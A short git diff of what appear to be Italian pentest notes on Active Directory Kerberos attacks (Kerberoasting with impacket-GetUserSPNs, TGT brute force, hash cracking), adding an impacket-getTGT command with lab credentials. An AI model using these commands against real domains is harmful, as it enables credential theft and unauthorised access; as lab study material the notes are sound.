@@ -22,6 +22,11 @@ Dopo cracca l'hash
 impacket-GetUserSPNs <NOME MACCHINA>/<USER>:<PASS> -request
 ```
 ### **TGT BruteForce**
+```bash
+impacket-getTGT 'essos.local/khal.drogo:horse'
+```
+```bash
+
 
 ### **CRACK KRB5 HASH**
 ```bash
